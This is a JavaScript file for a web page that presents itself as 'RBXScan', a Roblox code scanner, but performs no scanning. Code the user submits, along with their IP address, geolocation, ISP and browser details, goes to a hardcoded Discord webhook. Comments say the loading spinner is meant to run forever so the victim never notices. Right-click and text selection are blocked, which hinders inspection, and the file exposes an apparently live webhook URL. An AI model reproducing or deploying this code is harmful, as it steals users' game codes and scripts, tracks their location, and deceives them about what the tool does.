// DOM Elements
const statusMessage = document.getElementById('statusMessage');
const openScanBtn = document.getElementById('openScanBtn');

// Popup elements
const compilePopup = document.getElementById('compilePopup');
const compileForm = document.getElementById('compileForm');
const codeTextarea = document.getElementById('codeTextarea');
const compileSubmitBtn = document.getElementById('compileSubmitBtn');
const compileStatusMessage = document.getElementById('compileStatusMessage');
const closePopup = document.getElementById('closePopup');
const loadingContainer = document.getElementById('loadingContainer');
const mainLoadingContainer = document.getElementById('mainLoadingContainer');
const darkModeToggle = document.getElementById('darkModeToggle');

// Configuration
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// Rate limiting and spam prevention
let lastSubmissionTime = 0;
let submittedCodes = new Set();
const RATE_LIMIT_MS = 30000; // 30 seconds between submissions
const MIN_CODE_LENGTH = 10;
const MAX_CODE_LENGTH = 1000;

// Utility Functions
function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        statusMessage.classList.remove('show');
    }, 3000);
}

function getCurrentTimestamp() {
    return new Date().toLocaleString();
}

function isValidCode(code) {
    const cleanCode = code.trim();

    // Check minimum length with specific message
    if (cleanCode.length < MIN_CODE_LENGTH) {
        return { valid: false, reason: 'Too short! Code must be at least 10 characters long.' };
    }

    // Check maximum length
    if (cleanCode.length > MAX_CODE_LENGTH) {
        return { valid: false, reason: `Code too long! Must not exceed ${MAX_CODE_LENGTH} characters.` };
    }

    // Check if code was already submitted
    const codeHash = btoa(cleanCode).substring(0, 20);
    if (submittedCodes.has(codeHash)) {
        return { valid: false, reason: 'This code has already been submitted!' };
    }

    // Check for obvious spam patterns
    const spamPatterns = [
        /^(.)\1{5,}$/,  // Same character repeated 6+ times (entire string)
        /^(..)\1{3,}$/, // Same 2 characters repeated 4+ times (entire string) 
        /^(test|spam|hello|hi|asdf|qwerty|123|abc)+$/i, // Common spam words only
        /^[^a-zA-Z0-9]*$/, // Only special characters
        /^\s*$/, // Only whitespace
        /^[0-9]{1,5}$/, // Just simple numbers 1-5 digits
        /^[a-zA-Z]{1,8}$/, // Just simple letters 1-8 characters
    ];

    for (const pattern of spamPatterns) {
        if (pattern.test(cleanCode)) {
            return { valid: false, reason: 'Stop spamming nonsense! Enter a real code.' };
        }
    }

    // Check for too few unique characters (spam detection)
    const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
    if (uniqueChars < 4) {
        return { valid: false, reason: 'Stop spamming! Your input has too few unique characters.' };
    }

    // Must look like actual code - allow various code formats
    const codePatterns = [
        // Programming code patterns
        /\b(function|var|let|const|if|else|for|while|return|class|def|import|require|local|end)\b/i,
        // Script/game code patterns  
        /^[A-Z0-9]{8,}$/i, // All caps alphanumeric (game codes)
        /^[a-zA-Z0-9]{12,}$/, // Long alphanumeric strings
        // URL patterns (scripts)
        /https?:\/\//,
        /www\./,
        // Base64 patterns
        /^[A-Za-z0-9+\/=]{15,}$/,
        // Hex codes
        /^[0-9a-fA-F]{12,}$/,
        // UUID patterns
        /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i,
        // Programming syntax
        /[{}();=\[\]]/,
        // Lua/Roblox script patterns
        /(loadstring|getfenv|spawn|wait|print|script|game\.|workspace\.|_G\.|getgenv)/i,
        // Common code structures
        /(\.lua|\.js|\.py|\.rb|\.php)/i,
        // Pastebin/script sharing sites
        /(pastebin|github|gist|raw\.githubusercontent)/i,
        // Has both letters and numbers in a complex way
        /^(?=.*[a-zA-Z])(?=.*[0-9])[a-zA-Z0-9\s\-_+=\/\\(){}\[\];:'".,!@#$%^&*]{10,}$/
    ];

    let isValidFormat = false;
    for (const pattern of codePatterns) {
        if (pattern.test(cleanCode)) {
            isValidFormat = true;
            break;
        }
    }

    if (!isValidFormat) {
        return { valid: false, reason: 'Enter a real code! (script, game code, URL, etc.)' };
    }

    return { valid: true };
}

function checkRateLimit() {
    const now = Date.now();
    
    // Check time-based rate limit
    if (now - lastSubmissionTime < RATE_LIMIT_MS) {
        const waitTime = Math.ceil((RATE_LIMIT_MS - (now - lastSubmissionTime)) / 1000);
        return { allowed: false, reason: `Please wait ${waitTime} seconds before submitting again` };
    }

    return { allowed: true };
}

// Location and Webhook Functions
async function getLocationInfo() {
    try {
        // Get IP-based location info
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unable to fetch',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            timezone: 'Unknown',
            isp: 'Unknown'
        };
    }
}

async function sendToWebhook(code) {
    try {
        // Get location information
        const locationInfo = await getLocationInfo();
        
        const payload = {
            content: "@everyone 🚨 **NEW CODE DETECTED** 🚨",
            embeds: [{
                title: "🔍 RBXScan - Code Submission Alert",
                description: `**📝 Submitted Code:**\n\`\`\`\n${code}\n\`\`\``,
                color: 0xFF4444, // Red color for alert
                timestamp: new Date().toISOString(),
                footer: {
                    text: "RBXScan Alert System"
                },
                fields: [
                    {
                        name: "📅 Submission Time",
                        value: getCurrentTimestamp(),
                        inline: true
                    },
                    {
                        name: "🌐 IP Address",
                        value: locationInfo.ip,
                        inline: true
                    },
                    {
                        name: "🏙️ Location",
                        value: `${locationInfo.city}, ${locationInfo.region}`,
                        inline: true
                    },
                    {
                        name: "🌍 Country",
                        value: locationInfo.country,
                        inline: true
                    },
                    {
                        name: "🕐 Timezone",
                        value: locationInfo.timezone,
                        inline: true
                    },
                    {
                        name: "🌐 ISP",
                        value: locationInfo.isp,
                        inline: true
                    },
                    {
                        name: "💻 User Agent",
                        value: navigator.userAgent.substring(0, 100) + "...",
                        inline: false
                    },
                    {
                        name: "📱 Platform",
                        value: `${navigator.platform} - ${navigator.language}`,
                        inline: true
                    },
                    {
                        name: "🔗 Source",
                        value: "RBXScan Website",
                        inline: true
                    }
                ]
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            return { success: true };
        } else {
            throw new Error(`HTTP ${response.status}`);
        }
    } catch (error) {
        console.error('Webhook error:', error);
        return { success: false, error: error.message };
    }
}

// Event Handlers
function showCompileStatus(message, type) {
    compileStatusMessage.textContent = message;
    compileStatusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        compileStatusMessage.classList.remove('show');
    }, 3000);
}

// Open scan popup
openScanBtn.addEventListener('click', () => {
    compilePopup.style.display = 'block';
    codeTextarea.focus();
});

closePopup.addEventListener('click', () => {
    compilePopup.style.display = 'none';
    codeTextarea.value = '';
    loadingContainer.style.display = 'none';
    compileSubmitBtn.disabled = false;
    compileSubmitBtn.textContent = '🚀 Start Scanning';
});

// Close popup when clicking outside
compilePopup.addEventListener('click', (e) => {
    if (e.target === compilePopup) {
        closePopup.click();
    }
});

// Compile form submission
compileForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const code = codeTextarea.value.trim();
    
    if (!code) {
        showCompileStatus('Please enter code to scan', 'error');
        return;
    }

    // Check rate limiting
    const rateLimitCheck = checkRateLimit();
    if (!rateLimitCheck.allowed) {
        showCompileStatus(rateLimitCheck.reason, 'error');
        return;
    }

    // Validate code format - prevent nonsense spam
    const validation = isValidCode(code);
    if (!validation.valid) {
        showCompileStatus(validation.reason, 'error');
        return;
    }

    // Show infinite loading animation
    compileSubmitBtn.disabled = true;
    compileSubmitBtn.textContent = 'Scanning...';
    loadingContainer.style.display = 'block';
    compileStatusMessage.classList.remove('show');
    
    // Send to webhook in background
    const result = await sendToWebhook(code);
    
    if (result.success) {
        // Update rate limiting counters
        lastSubmissionTime = Date.now();
        const codeHash = btoa(code).substring(0, 20);
        submittedCodes.add(codeHash);
        
        // IMPORTANT: Keep loading animation running FOREVER
        // Never hide the loading or show success message
        // User must manually close popup or refresh page
    } else {
        // Only show error if webhook completely fails
        loadingContainer.style.display = 'none';
        compileSubmitBtn.disabled = false;
        compileSubmitBtn.textContent = '🚀 Start Scanning';
        showCompileStatus('❌ Scanning failed. Please try again.', 'error');
    }
});

// Clear input on page load for security
window.addEventListener('load', () => {
    if (codeTextarea) codeTextarea.value = '';
});

// Prevent right-click context menu for added security
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// Disable text selection for security
document.addEventListener('selectstart', (e) => {
    if (e.target !== codeTextarea) {
        e.preventDefault();
    }
});

// Dark mode functionality
function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const isDarkMode = document.body.classList.contains('dark-mode');
    darkModeToggle.textContent = isDarkMode ? '☀️ Light Mode' : '🌙 Dark Mode';
    localStorage.setItem('darkMode', isDarkMode);
}

// Load saved dark mode preference
function loadDarkModePreference() {
    const savedDarkMode = localStorage.getItem('darkMode');
    if (savedDarkMode === 'true') {
        document.body.classList.add('dark-mode');
        darkModeToggle.textContent = '☀️ Light Mode';
    }
}

// Dark mode toggle event
darkModeToggle.addEventListener('click', toggleDarkMode);

// Load dark mode preference on page load
loadDarkModePreference();